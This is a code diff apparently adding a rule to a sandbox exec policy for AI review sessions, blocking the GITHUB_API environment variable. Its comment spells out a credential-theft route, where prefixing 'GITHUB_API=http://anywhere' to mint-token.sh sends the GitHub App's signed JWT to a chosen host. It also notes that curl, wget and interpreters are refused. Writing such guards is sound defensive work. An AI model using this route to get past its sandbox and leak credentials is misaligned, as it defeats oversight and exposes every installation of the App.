@@ -702,7 +702,27 @@ const POLICY_RELOCATING_ENV = new Set([
   "QCR_POSTING_RECEIPT_DIR",
 ]);
 
+/**
+ * Env prefixes that move where a sanctioned script SENDS the App's credentials
+ * (found by execution). Every script that talks to GitHub reads its
+ * host from `GITHUB_API`, and `mint-token.sh` posts the App's signed JWT to it
+ * to mint an installation token — so `GITHUB_API=http://anywhere
+ * scripts/mint-token.sh` handed the JWT (which can mint a token for every
+ * installation of the App) to a host the session chose, through the one
+ * network channel this policy otherwise leaves closed: curl, wget and every
+ * interpreter are refused. The daemon never sets it for a session; the
+ * scripts' own default (`https://api.github.com`) is the only host a review
+ * needs. Tests point the scripts at a loopback stub by running them directly,
+ * never through this guard.
+ */
+const CREDENTIAL_RELOCATING_ENV = new Set(["GITHUB_API"]);
+
 function envInjectionBlock(name: string): BashCheck | null {
+  if (CREDENTIAL_RELOCATING_ENV.has(name)) {
+    return block(
+      `exec policy: '${name}=' moves the host the sanctioned scripts send the App's credentials to — a session never chooses where they go`,
+    );
+  }
   if (POLICY_RELOCATING_ENV.has(name)) {
     return block(
       `exec policy: '${name}=' relocates the posting guards' own configuration — the guards are not a knob a session may move`,
